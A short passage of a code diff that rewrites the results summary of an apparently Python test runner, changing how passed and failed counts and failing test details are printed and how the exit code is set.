-    else:
-        failed = [(n, d) for n, ok, d in results if not ok]
-        print(f"  — {len(failed)} failed:")
-        for name, detail in failed:
-            print(f"    ✗ {name}")
-            print(f"      {detail}")
-    print(f"{'═'*52}")
-    sys.exit(0 if passed == total else 1)
+
+    print(f"\n{'=' * 60}")
+    print(f"  Results: {passed}/{total} passed  ({failed} failed)")
+    print(f"{'=' * 60}\n")
+
+    if failed:
+        print("Failed tests:")
+        for name, ok, detail in results:
+            if not ok:
+                print(f"  • {name}")
+                print(f"    {detail}")
+        print()
+
+    sys.exit(0 if failed == 0 else 1)
 
 
 if __name__ == "__main__":
